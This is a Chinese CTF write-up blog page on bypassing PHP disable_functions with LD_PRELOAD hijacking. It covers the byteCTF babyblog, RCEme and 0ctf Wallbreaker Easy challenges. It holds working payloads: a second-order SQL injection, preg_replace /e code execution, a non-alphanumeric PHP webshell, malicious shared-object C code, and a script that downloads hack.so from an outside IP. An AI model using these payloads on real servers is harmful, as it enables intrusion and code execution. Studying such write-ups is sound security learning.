<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>LD_PRELOAD劫持类型题目 | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="贴几个参考链接
https://www.cnblogs.com/wfzWebSecuity/p/11213732.html
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="https://ch3n9w.cpolar.cn/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="apple-touch-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="mask-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://ch3n9w.cpolar.cn/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="LD_PRELOAD劫持类型题目" />
<meta property="og:description" content="贴几个参考链接
https://www.cnblogs.com/wfzWebSecuity/p/11213732.html
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ch3n9w.cpolar.cn/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-12-26T16:37:19+00:00" />
<meta property="article:modified_time" content="2019-12-26T16:37:19+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="LD_PRELOAD劫持类型题目"/>
<meta name="twitter:description" content="贴几个参考链接
https://www.cnblogs.com/wfzWebSecuity/p/11213732.html
https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ch3n9w.cpolar.cn/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "LD_PRELOAD劫持类型题目",
      "item": "https://ch3n9w.cpolar.cn/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "LD_PRELOAD劫持类型题目",
  "name": "LD_PRELOAD劫持类型题目",
  "description": "贴几个参考链接\nhttps://www.cnblogs.com/wfzWebSecuity/p/11213732.html\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\n",
  "keywords": [
    
  ],
  "articleBody": "贴几个参考链接\nhttps://www.cnblogs.com/wfzWebSecuity/p/11213732.html\nhttps://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD\nbyteCTF babyblog 看首页\n功能点\n写博客 编辑博客 删除博客 查找字符串并替换 这个replace有点诡异, 需要vip身份, 看源代码关键的一步在edit.php中\nif(isset($_POST['title']) \u0026\u0026 isset($_POST['content']) \u0026\u0026 isset($_POST['id'])){ foreach($sql-\u003equery(\"select * from article where id=\" . intval($_POST['id']) . \";\") as $v){ $row = $v; } if($_SESSION['id'] == $row['userid']){ $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql-\u003equery(\"update article set title='$title',content='$content' where title='\" . $row['title'] . \"';\"); exit(\"\"); }else{ exit(\"\"); } } 这里存在一处二次注入, 将原来的文章选出来后将他的title不经过addslashes直接拼接进了update语句中.\nupdate users set isvip=1 where username='ch3n9w' ';set @a=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d2763683473657227;prepare kk from @a;execute kk;' 这样我就是vip了, 可以使用replace功能了, 这个在源码中其实就是preg_replace.\n$content = addslashes(preg_replace(\"/\" . $_POST['find'] . \"/\", $_POST['replace'], $row['content'])); 传入参数\nfind=/e%00 replace=phpinfo(); 就执行成功了, 写一个shell进去先. 然后发现system类函数都被禁用了, 而且还有basedir限制, 在init_set被禁止的情况下, 可以使用glob协议\nif ($dh = opendir(\"glob:///*\")) {while (($file = readdir($dh)) !== false) {echo \"$file\\n\";}closedir($dh);} 发现根目录有/readflag和/flag, 接下来使用LD_PRELOAD来绕过disable_function的限制, 在disable_function中看到mail函数都被禁用了, 而且没有安装imagemagick , 可以考虑使用error_log来触发, 问题是这题目在buuoj经过了魔改, /readflag不会直接给出flag而是给出了一道计算题, 回答正确之后才会给出flag, 寻找一个perl脚本来执行, 这是*ctf的一道题目的perl脚本\nuse strict; use IPC::Open3; my $pid = open3( \\*CHLD_IN, \\*CHLD_OUT, \\*CHLD_ERR, '/readflag' ) or die \"open3() failed $!\"; my $r; $r = ; print \"$r\"; $r = ; print \"$r\"; $r = eval \"$r\"; print \"$r\\n\"; print CHLD_IN \"$r\\n\"; $r = ; print \"$r\"; $r = ; print \"$r\"; $r = ; print \"$r\"; $r = ; print \"$r\"; 写入之后, 由hack.c编译一个hack.so, hack.c内容如下:\n#define _GNU_SOURCE #include #include #include #include #include void pwn(void) { system(\"perl /var/www/html/exp.perl \u003e /var/www/html/res 2\u003e\u00261\"); } void getpid(){ unsetenv(\"LD_PRELOAD\"); pwn(); } 最后执行\nputenv(\"LD_PRELOAD=/var/www/html/payload.so\");error_log(\"\",1,\"\",\"\"); 就可以拿到flag了\n极客大挑战 RCEme \u003c?php error_reporting(0); if(isset($_GET['code'])){ $code=$_GET['code']; if(strlen($code)\u003e40){ die(\"This is too Long.\"); } if(preg_match(\"/[A-Za-z0-9]+/\",$code)){ die(\"NO.\"); } @eval($code); } else{ highlight_file(__FILE__); } // ?\u003e 首先是个无字母数字shell\nhttp://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=\"`{{{\"^\"?\u003c\u003e/\";${$_}[_](${$_}[__]);\u0026_=assert\u0026__=phpinfo() 很遗憾的发现system等函数都不能执行.\n上蚁剑,但是很奇怪的不能直接用密码__来连接, 要这样连, 不然会有奇怪的东西显示\nhttp://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=\"`{{{\"^\"?\u003c\u003e/\";${$_}[_](${$_}[__]);\u0026_=assert\u0026__=eval($_POST[a]) ……原来一定要eval么…..\n然后发现根目录下有无读权限的flag和一个readflag二进制文件.\n连上之后向/tmp目录下面写两个东西, 一个是本地生成的so文件,\nhack.c\n#include #include #include __attribute__ ((__constructor__)) void angel (void){ unsetenv(\"LD_PRELOAD\"); system(\"/readflag \u003e /tmp/ch3n9w\"); } 编译\ngcc -shared -fPIC hack.c -o hack.so 拖上去就行了\nch3n9w.php\n\u003c?php putenv(\"LD_PRELOAD=/tmp/hack.so\"); mail(\"\", \"\", \"\", \"\"); ?\u003e 最后包含代码去执行\nhttp://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=\"`{{{\"^\"?\u003c\u003e/\";${$_}[_](${$_}[__]);\u0026_=assert\u0026__=include(\"/tmp/ch3n9w.php\") mail函数产生进程的同时就会触发preload中的代码, 然后读输出中的flag就行了\n0ctf Wallbreaker Easy 这道题目参考了小西师傅、一叶飘零和郭dalao学长的分享,真实地感觉自己的菜了。。。\n在写脚本的过程中遇见了很多诡异的问题，先留着琢磨。\n主要思路 利用Imagick()中会触发php解释器向外开启系统进程的方法，这里的思路是当传入MPEG格式类型的文件时候，为了转换格式会向外部环境请求并触发ffmpeg的调用，从而开启新的进程。在开启时，环境变量LD_PRELOAD会首先加载，而我们事先会将我们的恶意共享文件hack.so在这个环境变量中指出来，即LD_PRELOAD={DIR}/hack.so。hack.so共享文件由hack.c文件编译，其中调用了__attribute__((constructor))，该方法会在共享文件被加载的时候率先被执行，至于执行的代码，当然就是/readflag \u003e {dir}/flag啦。主要代码如下，代码写法借鉴了郭大佬的脚本，虽然思路不一样，个人感觉dalao的思路更加直接明了。\n脚本\nimport requests import base64 url = \"http://111.186.63.208:31340/\" dir = \"/tmp/ef757c06e983a137384378f47607abfa\" #the first time i do this ,i use format function 'format' to replace $dir but failed,then i used $dir and '%',worked ,after the flag went out ,the format problem seems to dispeare? #the new Imagick('{filename}') beginning with no work,but didnot after replace'''to '\"',also disapeared after sovled it cmd = ''' hello???????\n\u003c?php echo 'hello';?\u003e\n\u003c?php $dir = \"{0}\"; file_put_contents(\"{0}/hack.so\",file_get_contents(\"http://207.148.64.125:80/hack.so\")); chmod(\"{0}/hack.so\",0777); putenv(\"LD_PRELOAD={0}/hack.so\"); file_put_contents(\"{0}/ch3n9w.wmv\",\"sssss\"); file_put_contents(\"{0}/ch3n9w\",\"\"); $tocken = new Imagick('{0}/ch3n9w.wmv'); ?\u003e '''.format(dir) #why the command line been executed can not be more than 2 in my script?cause the include will cause error payload = ''' file_put_contents('%s/evil',base64_decode(\"%s\")); include \"%s/evil\"; '''%(dir,base64.b64encode(cmd),dir) print(requests.post(url, data={'backdoor': payload }).content) print requests.post(url,data={'backdoor':\"print_r(scandir('%s'));\"%dir}).content print requests.post(url,data={'backdoor':\"echo file_get_contents('%s/ch3n9w');\"%dir}).content 脚本写得很烂，注释部分可以忽略，是我在写的过程中遇到的小问题。\n然后服务器上面的hack.c文件如下：\n#include #include __attribute__ ((__constructor__)) void angel (void){ system(\"/readflag \u003e /tmp/ch3n9w\"); } 使用命令gcc --share -fPIC hack.c -o hack.so命令来编译共享文件。在服务器目录下面开启python -m SimpleHTTPServer 80，并运行上述python脚本，即可看到flag。\nps:每个人的目录会不定时被服务器清空\n如果LD_PRELOAD不行可以考虑上通杀马\nhttps://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php\n",
  "wordCount" : "435",
  "inLanguage": "en",
  "datePublished": "2019-12-26T16:37:19Z",
  "dateModified": "2019-12-26T16:37:19Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ch3n9w.cpolar.cn/posts/sec-ld-preload%E5%8A%AB%E6%8C%81%E7%B1%BB%E5%9E%8B%E9%A2%98%E7%9B%AE/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ch3n9w.cpolar.cn/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="https://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ch3n9w.cpolar.cn/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://ch3n9w.cpolar.cn/">Home</a>&nbsp;»&nbsp;<a href="https://ch3n9w.cpolar.cn/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      LD_PRELOAD劫持类型题目
    </h1>
    <div class="post-meta"><span title='2019-12-26 16:37:19 +0000 UTC'>December 26, 2019</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;435 words&nbsp;·&nbsp;ch3n9w

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#主要思路">主要思路</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>贴几个参考链接</p>
<p><a href="https://www.cnblogs.com/wfzWebSecuity/p/11213732.html">https://www.cnblogs.com/wfzWebSecuity/p/11213732.html</a></p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<h1 id="bytectf-babyblog">byteCTF babyblog<a hidden class="anchor" aria-hidden="true" href="#bytectf-babyblog">#</a></h1>
<p>看首页</p>
<p><img loading="lazy" src="image-20200130163255077.png" alt="image-20200130163255077"  />
</p>
<p>功能点</p>
<ul>
<li>写博客</li>
<li>编辑博客</li>
<li>删除博客</li>
<li>查找字符串并替换</li>
</ul>
<p><img loading="lazy" src="image-20200130163356347.png" alt="image-20200130163356347"  />
</p>
<p>这个replace有点诡异, 需要<code>vip</code>身份, 看源代码关键的一步在<code>edit.php</code>中</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;title&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;content&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;id&#39;</span>])){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">foreach</span>($sql<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;select * from article where id=&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">intval</span>($_POST[<span style="color:#e6db74">&#39;id&#39;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;;&#34;</span>) <span style="color:#66d9ef">as</span> $v){
</span></span><span style="display:flex;"><span>		$row <span style="color:#f92672">=</span> $v;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;id&#39;</span>] <span style="color:#f92672">==</span> $row[<span style="color:#e6db74">&#39;userid&#39;</span>]){
</span></span><span style="display:flex;"><span>		$title <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_POST[<span style="color:#e6db74">&#39;title&#39;</span>]);
</span></span><span style="display:flex;"><span>		$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>($_POST[<span style="color:#e6db74">&#39;content&#39;</span>]);
</span></span><span style="display:flex;"><span>		$sql<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>(<span style="color:#e6db74">&#34;update article set title=&#39;</span><span style="color:#e6db74">$title</span><span style="color:#e6db74">&#39;,content=&#39;</span><span style="color:#e6db74">$content</span><span style="color:#e6db74">&#39; where title=&#39;&#34;</span> <span style="color:#f92672">.</span> $row[<span style="color:#e6db74">&#39;title&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39;;&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;Edited successfully.&#39;);location.href=&#39;index.php&#39;;&lt;/script&gt;&#34;</span>);
</span></span><span style="display:flex;"><span>	}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;You do not have permission.&#39;);history.go(-1);&lt;/script&gt;&#34;</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>这里存在一处二次注入, 将原来的文章选出来后将他的title不经过addslashes直接拼接进了update语句中.</p>
<pre tabindex="0"><code>update users set isvip=1 where username=&#39;ch3n9w&#39;

&#39;;set @a=0x757064617465207573657273207365742069737669703d3120776865726520757365726e616d653d2763683473657227;prepare kk from @a;execute kk;&#39;
</code></pre><p><img loading="lazy" src="image-20200130164043550.png" alt="image-20200130164043550"  />
</p>
<p>这样我就是vip了, 可以使用replace功能了, 这个在源码中其实就是<code>preg_replace</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">addslashes</span>(<span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">.</span> $_POST[<span style="color:#e6db74">&#39;find&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/&#34;</span>, $_POST[<span style="color:#e6db74">&#39;replace&#39;</span>], $row[<span style="color:#e6db74">&#39;content&#39;</span>]));
</span></span></code></pre></div><p>传入参数</p>
<pre tabindex="0"><code>find=/e%00
replace=phpinfo();
</code></pre><p>就执行成功了, 写一个shell进去先. 然后发现system类函数都被禁用了, 而且还有basedir限制, 在<code>init_set</code>被禁止的情况下, 可以使用<code>glob</code>协议</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($dh <span style="color:#f92672">=</span> <span style="color:#a6e22e">opendir</span>(<span style="color:#e6db74">&#34;glob:///*&#34;</span>)) {<span style="color:#66d9ef">while</span> (($file <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir</span>($dh)) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">$file\n</span><span style="color:#e6db74">&#34;</span>;}<span style="color:#a6e22e">closedir</span>($dh);}
</span></span></code></pre></div><p>发现根目录有<code>/readflag</code>和<code>/flag</code>, 接下来使用<code>LD_PRELOAD</code>来绕过<code>disable_function</code>的限制, 在<code>disable_function</code>中看到<code>mail</code>函数都被禁用了, 而且没有安装<code>imagemagick</code> , 可以考虑使用<code>error_log</code>来触发, 问题是这题目在buuoj经过了魔改, /readflag不会直接给出flag而是给出了一道计算题, 回答正确之后才会给出flag, 寻找一个perl脚本来执行, 这是*ctf的一道题目的perl脚本</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> strict;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> IPC::Open3;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">my</span> $pid <span style="color:#f92672">=</span> open3( <span style="color:#f92672">\*</span>CHLD_IN, <span style="color:#f92672">\*</span>CHLD_OUT, <span style="color:#f92672">\*</span>CHLD_ERR, <span style="color:#e6db74">&#39;/readflag&#39;</span> )
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">or</span> die <span style="color:#e6db74">&#34;open3() failed $!&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">my</span> $r;
</span></span><span style="display:flex;"><span>$r <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;CHLD_OUT&gt;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;$r&#34;</span>;
</span></span><span style="display:flex;"><span>$r <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;CHLD_OUT&gt;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;$r&#34;</span>;
</span></span><span style="display:flex;"><span>$r <span style="color:#f92672">=</span> eval <span style="color:#e6db74">&#34;$r&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;$r\n&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> CHLD_IN <span style="color:#e6db74">&#34;$r\n&#34;</span>;
</span></span><span style="display:flex;"><span>$r <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;CHLD_OUT&gt;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;$r&#34;</span>;
</span></span><span style="display:flex;"><span>$r <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;CHLD_OUT&gt;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;$r&#34;</span>;
</span></span><span style="display:flex;"><span>$r <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;CHLD_OUT&gt;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;$r&#34;</span>;
</span></span><span style="display:flex;"><span>$r <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;CHLD_OUT&gt;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;$r&#34;</span>;
</span></span></code></pre></div><p>写入之后, 由hack.c编译一个hack.so, hack.c内容如下:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define  _GNU_SOURCE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;signal.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">pwn</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;perl /var/www/html/exp.perl &gt; /var/www/html/res 2&gt;&amp;1&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getpid</span>(){
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">unsetenv</span>(<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pwn</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>最后执行</p>
<pre tabindex="0"><code>putenv(&#34;LD_PRELOAD=/var/www/html/payload.so&#34;);error_log(&#34;&#34;,1,&#34;&#34;,&#34;&#34;);
</code></pre><p>就可以拿到flag了</p>
<h1 id="极客大挑战-rceme">极客大挑战 RCEme<a hidden class="anchor" aria-hidden="true" href="#极客大挑战-rceme">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;code&#39;</span>])){
</span></span><span style="display:flex;"><span>            $code<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;code&#39;</span>];
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($code)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">40</span>){
</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;This is too Long.&#34;</span>);
</span></span><span style="display:flex;"><span>                                                }
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/[A-Za-z0-9]+/&#34;</span>,$code)){
</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;NO.&#34;</span>);
</span></span><span style="display:flex;"><span>                                                }
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($code);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ?&gt;
</span></span></span></code></pre></div><p>首先是个无字母数字shell</p>
<pre tabindex="0"><code>http://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=&#34;`{{{&#34;^&#34;?&lt;&gt;/&#34;;${$_}[_](${$_}[__]);&amp;_=assert&amp;__=phpinfo()
</code></pre><p>很遗憾的发现system等函数都不能执行.</p>
<p>上蚁剑,但是很奇怪的不能直接用密码__来连接, 要这样连, 不然会有奇怪的东西显示</p>
<pre tabindex="0"><code>http://268a054e-42e7-45d6-a8ba-7f3e67a00d0a.node3.buuoj.cn/?code=$_=&#34;`{{{&#34;^&#34;?&lt;&gt;/&#34;;${$_}[_](${$_}[__]);&amp;_=assert&amp;__=eval($_POST[a])
</code></pre><p>&hellip;&hellip;原来一定要eval么&hellip;..</p>
<p>然后发现根目录下有无读权限的flag和一个readflag二进制文件.</p>
<p>连上之后向/tmp目录下面写两个东西, 一个是本地生成的so文件,</p>
<p>hack.c</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
